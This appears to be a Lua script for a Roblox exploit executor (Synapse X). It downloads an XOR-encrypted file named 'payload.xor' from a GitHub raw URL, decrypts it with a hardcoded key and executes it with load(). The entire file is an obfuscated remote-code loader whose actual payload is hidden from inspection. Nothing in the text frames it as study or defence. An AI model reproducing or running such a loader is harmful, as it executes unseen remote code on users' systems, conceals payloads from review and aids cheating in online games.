local key = "aVysHSYBTqIuFaQW"

local function decrypt(data, key)
    local res = {}
    for i = 1, #data do
        local k = key:byte((i-1) % #key + 1)
        local c = data:byte(i)
        res[i] = string.char(bit32.band(bit32.bxor(c, k), 0xFF))
    end
    return table.concat(res)
end

local url = "https://raw.githubusercontent.com/janhub1/scriptsurvivelava1/main/payload.xor"

local success, response = pcall(function()
    return syn.request({
        Url = url,
        Method = "GET"
    }).Body
end)

if not success then
    warn("syn.request selhalo: " .. tostring(response))
    return
end

local decoded = decrypt(response, key)
load(decoded)()
